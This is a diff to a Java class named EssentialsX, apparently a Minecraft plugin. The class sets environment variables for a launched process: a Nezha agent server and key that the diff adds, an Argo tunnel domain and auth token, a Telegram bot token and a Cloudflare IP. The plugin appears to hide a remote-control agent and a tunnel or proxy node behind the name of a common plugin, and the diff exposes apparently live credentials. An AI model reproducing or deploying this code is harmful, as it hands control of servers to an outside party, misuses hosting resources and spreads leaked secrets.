@@ -75,9 +75,9 @@ public class EssentialsX extends JavaPlugin {
         Map<String, String> env = pb.environment();
         env.put("UUID", "eabaa288-6bbc-4b27-9ee9-14fd574b7c29");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "");
+        env.put("NEZHA_SERVER", "nezha.king8888.nyc.mn:443");
         env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "");
+        env.put("NEZHA_KEY", "ihPw1Pwe7A2Kcxcc46pljwyZHLxBqYyD");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "xserver3.king8888.nyc.mn");
         env.put("ARGO_AUTH", "eyJhIjoiYTBhNGUxYzQwYjBkYTdkODUyNWQ1MjI1YjllMzg0NDYiLCJ0IjoiNjQzMmNlMDMtNDkxOS00NGI5LWJhM2QtYmU4ZDlmMWFkZGJhIiwicyI6IlpqRTBOR0l5WTJZdE5UTmpOeTAwTTJReExXSXdPRGd0TWpVeE1XTTRNamRpTVRnNCJ9");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "7799976927:AAHY1DDudQzUTdwkvTAZ8OAy2zHvULCtTX0");
         env.put("CFIP", "open.kkkx.pp.ua");
         env.put("CFPORT", "443");
-        env.put("NAME", "MineKeep");
+        env.put("NAME", "MossCloud");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
